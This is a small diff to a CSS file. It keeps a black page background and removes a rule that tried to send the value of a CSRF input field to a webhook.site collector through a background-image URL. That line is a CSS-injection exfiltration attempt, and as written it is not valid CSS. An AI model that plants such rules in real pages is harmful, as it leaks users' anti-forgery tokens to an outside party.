@@ -1,7 +1,4 @@
 body{
   background-color: black;
 }
-input.csrf{
-    background-image: url("https://webhook.site/cbea16b9-2a4a-41dd-806d-100ce4bd3921?value"+attr(value));
-    
-  }
+
